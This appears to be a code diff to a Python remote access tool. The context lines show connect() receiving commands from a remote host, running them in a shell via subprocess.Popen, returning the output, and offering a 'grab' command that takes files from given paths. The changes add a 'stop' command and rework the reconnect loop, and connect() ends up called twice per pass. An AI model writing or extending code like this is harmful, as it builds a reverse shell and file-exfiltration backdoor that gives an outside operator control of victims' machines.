@@ -232,6 +232,8 @@ def connect(ip_address, port):
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         elif 'terminate' in command:
            return 1
+        elif 'stop' in command:
+            return 2
         elif 'grab' in command:            
             grab,path = command.split(' ')
             try:
@@ -302,17 +304,16 @@ def connect(ip_address, port):
             s.send( CMD.stderr.read()  ) 
 
 def run():
-    count = 0
     ip_address, port = getIpAddress()
     while True:
         try:
             if connect(ip_address, port) == 1:
                 return True
+            if connect(ip_address, port) == 2:
+                return True
         except:
-            count += 1
-            if count == 2:
-                return False
-            pass
+            print("Checking", ip_address, "for a connection....")
+            return False
 
 def main ():
     while True: 
